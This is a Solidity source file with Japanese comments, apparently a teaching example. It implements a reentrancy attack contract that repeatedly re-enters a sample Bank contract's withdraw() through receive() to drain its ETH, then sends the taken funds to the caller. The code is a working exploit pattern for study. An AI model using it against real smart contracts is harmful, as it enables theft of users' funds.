// SPDX-License-Identifier: MIT
// by 0xAA
pragma solidity ^0.8.21;

import "./Bank.sol";

/**
 * @title Attack - リエントランシー攻撃コントラクト
 * @notice Bankコントラクトに対してリエントランシー攻撃を実行するサンプルコントラクト
 * @dev このコントラクトは教育目的のみで、悪意のある使用は禁止されています
 */
contract Attack {
    Bank public bank; // 攻撃対象のBankコントラクトアドレス

    // イベント定義
    event AttackStarted(address attacker, uint256 initialDeposit);
    event AttackCompleted(address attacker, uint256 stolenAmount);
    event ReentrancyExecuted(uint256 bankBalance);

    /**
     * @notice コンストラクタ - Bankコントラクトアドレスを初期化
     * @param _bank 攻撃対象のBankコントラクトアドレス
     */
    constructor(Bank _bank) {
        bank = _bank;
    }

    /**
     * @notice receive関数 - リエントランシー攻撃の核心部分
     * @dev ETHを受け取る際に自動的に呼び出される関数
     *
     * 攻撃の仕組み：
     * 1. Bankからwithdraw()でETHを受け取る
     * 2. receive()が自動実行される
     * 3. 銀行にまだ残高があれば再度withdraw()を呼び出す
     * 4. この循環により銀行の残高が尽きるまで繰り返される
     *
     * なぜ成功するか：
     * - Bank.withdraw()は送金後に残高を0にリセット
     * - receive()が実行される時点では、まだ残高がリセットされていない
     * - よって残高チェックを通過し続ける
     */
    receive() external payable {
        emit ReentrancyExecuted(bank.getBalance());

        // 銀行に1 ether以上の残高がある限り、再度出金を試みる
        if (bank.getBalance() >= 1 ether) {
            bank.withdraw();
        }
    }

    /**
     * @notice 攻撃実行関数
     * @dev リエントランシー攻撃を開始する
     *
     * 攻撃手順：
     * 1. 1 ETHを預金（正当なユーザーになりすます）
     * 2. withdraw()を呼び出して出金開始
     * 3. receive()関数が連鎖的に呼び出される
     * 4. 銀行の全資産を奪取完了
     */
    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");

        emit AttackStarted(msg.sender, msg.value);

        // ステップ1: 正当なユーザーとして1 ETHを預金
        bank.deposit{value: 1 ether}();

        // ステップ2: 出金を開始（ここからリエントランシー攻撃が始まる）
        bank.withdraw();

        emit AttackCompleted(msg.sender, address(this).balance);
    }

    /**
     * @notice このコントラクトの残高を取得
     * @return 攻撃により奪取したETHの総額
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice 攻撃者への資金引き出し機能
     * @dev 攻撃完了後、奪取した資金を攻撃者に送金
     */
    function withdrawStolenFunds() external {
        require(address(this).balance > 0, "No funds to withdraw");

        // 攻撃者に全資金を送金
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(success, "Failed to send stolen funds");
    }

    /**
     * @notice 緊急停止機能（デモ用）
     * @dev 攻撃をシミュレートする際の安全装置
     */
    function emergencyStop() external {
        selfdestruct(payable(msg.sender));
    }
}